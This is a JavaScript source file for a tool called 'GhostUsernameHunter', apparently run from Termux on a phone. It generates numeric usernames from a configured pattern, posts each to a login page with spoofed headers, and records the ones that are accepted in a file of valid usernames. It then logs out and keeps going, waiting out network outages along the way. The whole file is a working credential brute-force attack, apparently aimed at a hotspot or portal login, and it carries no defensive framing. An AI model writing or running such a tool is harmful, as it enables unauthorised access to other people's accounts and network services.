import chalk from 'chalk';
import axios from 'axios';
import { loadConfig, getConfigLastModified } from './config.js';
import { generateUsername } from './generator.js';
import {logOut,playSound, logBanner,PrintTime, logValid, logInvalid, logError, logToFile } from './logger.js';
import { delay, loadTestedSet } from './util.js';

export async function runHunter() {
    let config = loadConfig();
    let lastModified = getConfigLastModified();
    const tested = loadTestedSet('../tested_usernames.txt');

    logBanner("GhostUsernameHunter", config);

    const totalAttempts = Math.pow(
        config.digits.length,
        config.length - config.prefix.length - config.suffix.length
    );
    let attempts = 0;

    let loginPageHtml = '';
    try {
        const res = await axios.get(config.url);
        loginPageHtml = res.data;
    } catch (err) {
        console.log('[!] Failed to load login page:', err.message);
        return;
    }


function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function checkServerConnection(url) {
    try {
        await axios.get(url, { timeout: 5000 });
        return true;
    } catch (err) {
        return false;
    }
}
let c=0;
    for (let i = 0; i < config.count; i++) {
        let serverOnline = await checkServerConnection(config.url);
      while (!serverOnline) {
            console.log(chalk.green(`[+] wait for connect please check from Network `));
            await delay(5000);
            serverOnline = await checkServerConnection(config.url);
        }

     const startt = Date.now();

        if (getConfigLastModified() !== lastModified) {
            config = loadConfig();
            lastModified = getConfigLastModified();
        }

        const username = generateUsername(config.length, config.digits, config.prefix, config.suffix);
        if (tested.has(username)){
 continue;}
c++;
        tested.add(username);
        logToFile('./tested_usernames.txt', username);
        attempts++;

        const headers = {
            'User-Agent': 'Mozilla/5.0',
            'Referer': 'http://g.com/index.html'
        };

        const payload = new URLSearchParams({
            username,
            var: 'callBack',
            verfiy: false
        });

        try {
            const res = await axios.post(config.url, payload, { headers });

            if (typeof res.data === 'string') {
                if (!res.data.includes('<input')) {
                    logValid(username,'  #### '+ c);
                   const now = new Date().toLocaleString(); // آلَوٌقُتٌ وٌآلَتٌآريَخِ آلَحًآلَيَ
                   const logLine = `${username} - ${now}`;
                   logToFile('./valid_usernames.txt',logLine);
                    playSound('/data/data/com.termux/files/home/LoginHunter/src/success.mp3');
                   
                    await axios.get(config.logout_url, { withCredentials: true });
                    logOut(username);
                } else {
                    logInvalid(username,'  #### '+ c);
                  
                }
            } else {
                if (res.data.logged_in === 'yes') {
                    logValid(username,'  #### '+ c);
                    now = new Date().toLocaleString(); // الوقت والتاريخ الحالي
                   logLine = `${username} - ${now}`;
                   logToFile('./valid_usernames.txt',logLine);
                   playSound('success.mp3');
                    await axios.get(config.logout_url, { withCredentials: true });
                    logOut(username);
                } else {
                    logInvalid(username,'  #### '+ c);
                  
                }
            }

//            await delay(1000);
        } catch (err) {
            logError(err, username);
        }
            const End = Date.now();
            const all=End - startt;
            PrintTime(all);
    }

    if (attempts >= totalAttempts) {

        console.log('[*] All possible usernames have been tested.');
 


        }
}

